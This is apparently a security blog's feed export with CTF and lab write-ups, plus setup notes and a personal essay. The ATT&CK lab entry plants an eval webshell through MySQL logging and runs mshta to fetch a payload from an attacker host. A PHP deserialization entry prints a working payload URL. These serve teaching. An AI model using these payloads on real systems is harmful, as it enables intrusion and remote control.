punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">xixi</span><span class="token operator">=</span><span class="token keyword">clone</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">"haha"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token function">haha</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">z</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">;</span> <span class="token comment">//触发__get</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span> <span class="token comment">//__clone 的深拷贝用法</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">h</span><span class="token punctuation">;</span>  <span class="token comment">//赋值实例化h类， 触发__call</span><span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//echo $poc;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><strong>output：</strong></p><pre class="language-none"><code class="language-none">O:1:&quot;z&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;e&quot;:3:&#123;s:1:&quot;z&quot;;r:2;s:1:&quot;f&quot;;O:1:&quot;h&quot;:1:&#123;s:6:&quot;method&quot;;a:3:&#123;i:0;s:4:&quot;haha&quot;;i:1;s:4:&quot;hehe&quot;;i:2;s:4:&quot;dada&quot;;&#125;&#125;s:3:&quot;arg&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;timu2.php?poc&#x3D;O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164159329.png" alt="image-20211201164159329"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png&quot; alt=&quot;image-20211201164317651&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="PHP代码审计" scheme="http://www.greetdawn.top/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="PHP反序列化" scheme="http://www.greetdawn.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>重新开始</title>
    <link href="http://www.greetdawn.top/2021/11/24/wechat/newstart/"/>
    <id>http://www.greetdawn.top/2021/11/24/wechat/newstart/</id>
    <published>2021-11-24T03:04:40.000Z</published>
    <updated>2021-11-24T07:23:35.590Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/australian-shepherd-g7296cf807_1920.jpg" alt="australian-shepherd-g7296cf807_1920"></p><span id="more"></span><p>​        时过境迁，微信公众号开通到零零散散的发了几篇文章已经是2019年的事情了。那个时候还是个意气风发、朝气蓬勃的精神小伙。只身一人就毅然决然的跑到了北京，想开拓了一片属于自己的天地，可能这就是那个时候年轻人所谓的“梦想“吧。</p><p>​        一转眼再回想时，已经快过了有四年的时间了。那个时候还没有疫情，目前生活方式和特点和当初来说已经发生了较大的变化了。真的不仅是生活方式和大环境发生了变化，人的心态更是发生了更大的变化。</p><p>​        今天刚好和前同事商量恢复公众号的运营，前同事也是欣然的答应接受了。挺好的，虽然最近两年一直在尝试着写博客，但是总觉得缺点什么东西。总感觉自己处于一个不伦不类的生活和工作状态中。自己总想着改变自己的生活方式和节奏状态，但总感觉心有余而力不足。其实这里的力不足并不是说自己能力不够，而是自己<strong>没有一个持之以恒的态度，去长期坚持做好一件事情</strong>。比如写公众号、看书、学英语、早起这些之前给自己定的计划和安排，总没有一个成功落地实施的。自己总是处于一种心浮气躁的状态，囫囵吞枣，啥都做一做，啥都弄一弄，但是啥都不专精。其实说白了，这就是一种无能的表现。一个人连控制自己做什么都做不到，那就是处于被某种东西支配的现状下获取短暂的及时行乐，到头来却一无是处。其实真的开心么，或许是短暂的开心，冲内心里来说，自己不愿意处于这种现状中，但是自己却又无力走出来。</p><p>​        借着这个机会刚好总结一下这段时间的现状。最近一直围绕着工作不停的瞎折腾，最近下半年前前后后两个月时间里换了三份工作。其实自己在想到底是工作环境不对，还是我这个人不对。大概是我这个人出了问题，我的心思变得异常浮躁，对于身边的一切都开始变得惶恐、焦躁不安。觉得工作环境不合适，不利于我的个人发展，在诸多方面受到了压制，总是看到这些不好的层面。回想一下当初的工作心态就是单纯的，进入安全行业，努力学习安全技术就好。但是现在不一样了，随着工作经验的增加，技术的所谓提升，能力的所谓增加，一个人的心态发生了完全的变化。人的欲望开始增加，不单纯于技术的提升，人变得不纯粹了，更多的想着钱怎么挣多了，地位提升了，是不是可以做领导了。再这样的情况下，所有的环境都不满足自己了。</p><p>​        改变吧，从心态上开始。慢慢适应，慢慢提升。希望公众号的运营能够再次启程，和朋友共同经营下能够越来越好吧！胡扯了这么多有的没的，就这样吧，结束。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/australian-shepherd-g7296cf807_1920.jpg&quot; alt=&quot;australian-shepherd-g7296cf807_1920&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="微信公众号" scheme="http://www.greetdawn.top/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK_01靶场学习</title>
    <link href="http://www.greetdawn.top/2021/10/27/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/ATT-CK-01/"/>
    <id>http://www.greetdawn.top/2021/10/27/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/ATT-CK-01/</id>
    <published>2021-10-27T05:56:27.000Z</published>
    <updated>2021-11-22T10:29:34.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>靶场环境部署时，<code>win7</code>虚机需要进入系统手动开启一下<code>phpstudy</code>，且关闭防火墙。</p><h1 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看本机地址段，使用<code>netdiscover</code>发现同段存活主机</p><pre class="language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.49.0&#x2F;24</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165007738.png" alt="image-20211027165007738"></p><p>使用<code>nmap</code>扫描目前主机端口开放情况</p><pre class="language-none"><code class="language-none">nmap -T4 -A -v -sS 192.168.49.129</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027165746145.png" alt="image-20211027165746145"></p><p>站点目录扫描</p><pre class="language-none"><code class="language-none">python3 dirsearch.py -u &quot;http:&#x2F;&#x2F;192.168.49.129&#x2F;&quot; -e php</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028110507409.png" alt="image-20211028110507409"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028134039225.png" alt="image-20211028134039225"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="phpmyadmin写日志getshell"><a href="#phpmyadmin写日志getshell" class="headerlink" title="phpmyadmin写日志getshell"></a>phpmyadmin写日志getshell</h3><p>web访问发现直接是<code>phpstudy</code>探针,通过探针测试出<code>mysql</code>存在弱口令<code>root/root</code></p><p>因为<code>phpstudy</code>存在<code>phpmyadmin</code>组件，直接利用<code>phpmyadmin</code>实现写<code>webshell</code>操作</p><pre class="language-none"><code class="language-none">select &#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#39;</code></pre><p>但是开启了写文件限制</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172141356.png" alt="image-20211027172141356"></p><p>但是这里可以尝试使用日志文件<code>getshell</code></p><p>首先查看日志状态</p><pre class="language-none"><code class="language-none">show variables  like  &#39;%general%&#39;; </code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172342830.png" alt="image-20211027172342830"></p><p>当开启<code>general</code>时，所执行的<code>sql</code>语句都会出现在<code>stu1.log</code>文件中。那么，如果修改<code>generallogfile</code>的值，那么所执行的<code>sql</code>语句就会对应生成对应的文件中，进而<code>getshell</code>。</p><pre class="language-none"><code class="language-none">SET GLOBAL general_log&#x3D;&#39;on&#39;set GLOBAL general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#39;</code></pre><p>再次执行含有<code>shell</code>的语句，请求发现写入成功</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211027172655912.png" alt="image-20211027172655912"></p><h3 id="后台弱口令getshell"><a href="#后台弱口令getshell" class="headerlink" title="后台弱口令getshell"></a>后台弱口令getshell</h3><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028140613746.png" alt="image-20211028140613746"></p><p>根据备份站点文件获取完整路径信息</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.49.129&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028141427018.png" alt="image-20211028141427018"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>前台注册用户留言板插入,后台审核通过即可触发。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028141605979.png" alt="image-20211028141605979"></p><p>在实际业务场景下，可以以次获取管理用户cookie，伪造登录</p><h2 id="主机上线"><a href="#主机上线" class="headerlink" title="主机上线"></a>主机上线</h2><h3 id="cs主机上线提权"><a href="#cs主机上线提权" class="headerlink" title="cs主机上线提权"></a>cs主机上线提权</h3><p>使用蚁剑成功连接<code>shell</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028103301810.png" alt="image-20211028103301810"></p><p>使用<code>cs html</code>上线主机，且是<code>administrator</code>权限。</p><pre class="language-none"><code class="language-none">mshta http:&#x2F;&#x2F;192.168.49.130:80&#x2F;download&#x2F;file.ext</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028104449312.png" alt="image-20211028104449312"></p><p>使用<code>cs</code>内建提权码，成功提至管理员权限</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028110034370.png" alt="image-20211028110034370"></p><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><code>shell ipconfig /all</code>获取内网主机网段为192.168.29.0/24 域为 <code>god.org</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211028144122563.png" alt="image-20211028144122563"></p><p>查看域信息</p><p><code>shell net group /domain</code> </p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211122153614191.png" alt="image-20211122153614191"></p><p>上传<code>3389.bat</code>脚本开启3389端口 使用远程桌面进行连接</p><p>上传frp代理实现socks5内网穿透</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;靶场环境部署时，&lt;code&gt;win7&lt;/code&gt;虚机需要进入系统手动开启一下&lt;code&gt;phpstudy&lt;/code&gt;，且</summary>
      
    
    
    
    <category term="攻防渗透" scheme="http://www.greetdawn.top/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="红日靶场" scheme="http://www.greetdawn.top/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>shiro权限绕过（CVE-2020-1957）</title>
    <link href="http://www.greetdawn.top/2021/10/26/vulfocus/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/"/>
    <id>http://www.greetdawn.top/2021/10/26/vulfocus/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88CVE-2020-1957%EF%BC%89/</id>
    <published>2021-10-26T02:50:30.000Z</published>
    <updated>2021-12-24T10:09:36.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><code>Apache Shiro</code>是一个强大且易用的<code>Java</code>安全框架,执行身份验证、授权、密码和会话管理。2020年8月18日，<code>Apache Shiro</code>官方发布安全通告<code> Apache Shiro</code>身份验证绕过漏洞（<code>CVE-2020-13933</code>），经过分析，攻击者可以通过构造特殊的<code>HTTP</code>请求实现身份验证绕过。<code>Shiro</code>框架通过拦截器功能来对用户访问权限进行控制，如<code>anon, authc</code>等拦截器。<code>anon</code>为匿名拦截器，不需要登录即可访问；<code>authc</code>为登录拦截器，需要登录才可以访问。主要是<code>Spring web</code>在匹配<code>url</code>的时候没有匹配上/导致绕过。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>Apache Shiro &lt; 1.6.0</code> </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apache Shiro&lt;/code&gt;是一个强大且易用的&lt;code&gt;Java&lt;/code&gt;安全框架,执行身份验证</summary>
      
    
    
    
    <category term="vulfocus" scheme="http://www.greetdawn.top/categories/vulfocus/"/>
    
    
    <category term="shiro" scheme="http://www.greetdawn.top/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透信息收集</title>
    <link href="http://www.greetdawn.top/2021/08/14/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/Network-infiltration-base/"/>
    <id>http://www.greetdawn.top/2021/08/14/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/Network-infiltration-base/</id>
    <published>2021-08-14T05:46:21.000Z</published>
    <updated>2021-11-22T10:29:36.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透信息收集"><a href="#内网渗透信息收集" class="headerlink" title="内网渗透信息收集"></a>内网渗透信息收集</h1><h2 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h2><ul><li>获取主机名</li></ul><pre class="language-none"><code class="language-none">hostname</code></pre><ul><li>查询所有计算名称</li></ul><pre class="language-none"><code class="language-none">dsquery computer</code></pre><ul><li>查看配置及补丁信息</li></ul><pre class="language-none"><code class="language-none">systeminfowmic qfe get description,installedOn &#x2F;format:csv</code></pre><ul><li>系统版本</li></ul><pre class="language-none"><code class="language-none">ver</code></pre><ul><li>进程信息</li></ul><pre class="language-none"><code class="language-none">tasklist &#x2F;svcwmic process get caption,executablepath,commandline &#x2F;format:csvget-process</code></pre><ul><li>查看所有环境变量</li></ul><pre class="language-none"><code class="language-none">set</code></pre><ul><li>查看计划任务</li></ul><pre class="language-none"><code class="language-none">schtasks &#x2F;QUERY &#x2F;fo LIST &#x2F;v</code></pre><ul><li>查看安装驱动</li></ul><pre class="language-none"><code class="language-none">DRIVERQUERY</code></pre><ul><li>操作系统信息</li></ul><pre class="language-none"><code class="language-none">架构 wmic os get osarchitecture系统名 wmic os get caption</code></pre><ul><li><p>查看逻辑盘 <code>wmic logicaldisk get caption</code></p></li><li><p>查看安装的软件信息 <code>wmic product get name,version</code></p></li><li><p>查看服务信息</p><p><code>wmic service list brief</code></p><p><code>sc query</code></p></li></ul><h2 id="0x02-域信息"><a href="#0x02-域信息" class="headerlink" title="0x02 域信息"></a>0x02 域信息</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网渗透信息收集&quot;&gt;&lt;a href=&quot;#内网渗透信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网渗透信息收集&quot;&gt;&lt;/a&gt;内网渗透信息收集&lt;/h1&gt;&lt;h2 id=&quot;0x01-基本命令&quot;&gt;&lt;a href=&quot;#0x01-基本命令&quot; class=&quot;he</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息收集" scheme="http://www.greetdawn.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>picgo+gitee图床配置</title>
    <link href="http://www.greetdawn.top/2021/08/10/config/picgo-gitee-config/"/>
    <id>http://www.greetdawn.top/2021/08/10/config/picgo-gitee-config/</id>
    <published>2021-08-10T05:43:31.000Z</published>
    <updated>2021-08-10T05:55:58.378Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/code-820275_1920.jpg" alt="code-820275_1920"></p><span id="more"></span><h2 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h2><p><a href="https://github.com/Molunerfinn/PicGo/releases">picgo下载链接</a></p><p><a href="https://nodejs.org/en/">nodejs下载地址</a></p><p>提示:必须要配置安装完成<code>nodejs</code>后才可下载后续的插件</p><h2 id="picgo插件安装"><a href="#picgo插件安装" class="headerlink" title="picgo插件安装"></a>picgo插件安装</h2><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210810135143608.png" alt="image-20210810135143608"></p><h2 id="gitee仓库配置"><a href="#gitee仓库配置" class="headerlink" title="gitee仓库配置"></a>gitee仓库配置</h2><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724140756.png" alt="img"></p><p>在仓库中新建一个文件<code>img</code>用于存放上传的图片。</p><h3 id="获取码云的token"><a href="#获取码云的token" class="headerlink" title="获取码云的token"></a>获取码云的token</h3><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143356.png" alt="img"></p><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143451.png" alt="img"></p><p>验证完码云的密码后，会显示出token。注意，这个token只会在这里显示一次。</p><p><img src="https://gitee.com/nisodaisuki/pictures/raw/master/img/20200724143552.png" alt="img"></p><p>保存好token，将在配置PicGo插件时使用。</p><h2 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h2><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210810135527262.png" alt="image-20210810135527262"></p><p><strong>repo</strong>: gitee用户名/仓库名</p><p><strong>branch</strong>: 分支。指定为主分支</p><p><strong>token</strong>: 私人令牌。之前在码云上创建的令牌</p><p><strong>path</strong>: 图片存放路径。创建仓库时，新建的文件夹名。</p><p><strong>customPath</strong>：提交消息，这一项和下一项<strong>customURL</strong>都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 <code>Upload 图片名 by picGo - 时间</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/code-820275_1920.jpg&quot; alt=&quot;code-820275_1920&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="环境配置" scheme="http://www.greetdawn.top/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="图床配置" scheme="http://www.greetdawn.top/tags/%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>2021年红帽杯初赛ctf部分试题wp</title>
    <link href="http://www.greetdawn.top/2021/05/10/ctf/ctf-redhat2021/"/>
    <id>http://www.greetdawn.top/2021/05/10/ctf/ctf-redhat2021/</id>
    <published>2021-05-10T10:16:53.000Z</published>
    <updated>2021-05-12T01:16:59.819Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p><span id="more"></span><h2 id="1-签到-EBC"><a href="#1-签到-EBC" class="headerlink" title="1 签到 EBC"></a>1 签到 EBC</h2><p>下载文件发现该文件为EBC编码 使用kali自带工具iconv解码得到flag</p><p>Flag{we1c0me_t0_redhat2021}</p><p><code>iconv -f EBCDIC-IT -t utf-8 redhat/EBCDIC.txt</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210510182155.png"></p><h2 id="2-密码学-hpcurve"><a href="#2-密码学-hpcurve" class="headerlink" title="2 密码学-hpcurve"></a>2 密码学-hpcurve</h2><p>解密脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token keyword">import</span> structp <span class="token operator">=</span> <span class="token number">10000000000000001119</span>K <span class="token operator">=</span> GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span>R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> K<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> y<span class="token operator">=</span>xf <span class="token operator">=</span> y <span class="token operator">+</span> prod<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token string">'yyyyyyy'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>C <span class="token operator">=</span> HyperellipticCurve<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>J <span class="token operator">=</span> C<span class="token punctuation">.</span>jacobian<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_u_from_out</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> known_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">^</span>known_input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    u0<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u2 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"&lt;QQQ"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span>    u <span class="token operator">=</span> x<span class="token operator">^</span><span class="token number">3</span><span class="token operator">+</span>x<span class="token operator">^</span><span class="token number">2</span><span class="token operator">*</span>u2<span class="token operator">+</span>x<span class="token operator">*</span>u1<span class="token operator">+</span>u0    <span class="token keyword">return</span> u<span class="token keyword">def</span> <span class="token function">get_v_from_u</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">:</span>    Kbar <span class="token operator">=</span> GF<span class="token punctuation">(</span>p<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">)</span>    Rbar<span class="token punctuation">.</span><span class="token operator">&lt;</span>t<span class="token operator">></span> <span class="token operator">=</span> Kbar<span class="token punctuation">[</span><span class="token string">"t"</span><span class="token punctuation">]</span>    u2 <span class="token operator">=</span> u<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>Rbar<span class="token punctuation">)</span>    roots <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> u2<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    ys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> root <span class="token keyword">in</span> roots<span class="token punctuation">:</span>        ys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> perm <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        poly <span class="token operator">=</span> Rbar<span class="token punctuation">.</span>lagrange_polynomial<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>perm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> poly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> K<span class="token punctuation">:</span>            res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>R<span class="token punctuation">(</span>poly<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">try_decode</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> u<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">:</span>    rs <span class="token operator">=</span> <span class="token punctuation">[</span>u<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> u<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> u<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 